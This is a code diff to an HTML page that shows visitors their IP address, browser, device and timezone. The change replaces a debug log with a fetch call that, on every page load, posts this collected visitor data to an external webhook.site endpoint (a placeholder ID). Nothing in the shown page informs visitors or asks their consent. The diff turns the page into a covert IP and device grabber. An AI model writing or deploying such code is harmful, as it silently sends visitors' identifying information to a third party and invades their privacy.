@@ -36,7 +36,7 @@
   <p id="timezone">Fetching timezone...</p>
 
   <script>
-    async function fetchAndDisplayUserInfo() {
+    async function fetchAndSendUserInfo() {
       try {
         // Initialize display elements
         const ipElement = document.getElementById('ip');
@@ -66,8 +66,14 @@
         browserElement.textContent = `Browser: ${userInfo.browser} | Device: ${userInfo.device}`;
         timezoneElement.textContent = `Timezone: ${userInfo.timezone}`;
 
-        // Log data for debugging
-        console.log('User Info:', userInfo);
+        // Send data to Webhook.site
+        await fetch('https://webhook.site/your-unique-id', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(userInfo),
+        });
+
+        console.log('User Info sent successfully:', userInfo);
       } catch (error) {
         console.error('Error fetching user information:', error);
 
@@ -79,8 +85,8 @@
       }
     }
 
-    // Fetch and display user info when the page loads
-    window.onload = fetchAndDisplayUserInfo;
+    // Fetch and send user info when the page loads
+    window.onload = fetchAndSendUserInfo;
   </script>
 </body>
 </html>
